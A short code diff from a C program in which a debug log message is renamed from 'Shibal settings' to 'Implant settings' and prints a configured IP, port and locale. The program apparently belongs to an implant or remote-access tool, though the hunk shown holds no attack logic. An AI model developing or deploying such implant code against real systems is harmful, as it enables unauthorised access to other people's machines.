@@ -16,7 +16,7 @@ int main(int ac, char **av) {
     get_locale(&instance);
     DEBUG_LOG(
         instance.debug_enabled,
-        "[*] Shibal settings:\n\tIP:%s\n\tPort:%d\n\tlocale:%s",
+        "[*] Implant settings:\n\tIP:%s\n\tPort:%d\n\tlocale:%s",
         instance.ip, instance.port, instance.locale
     );
 
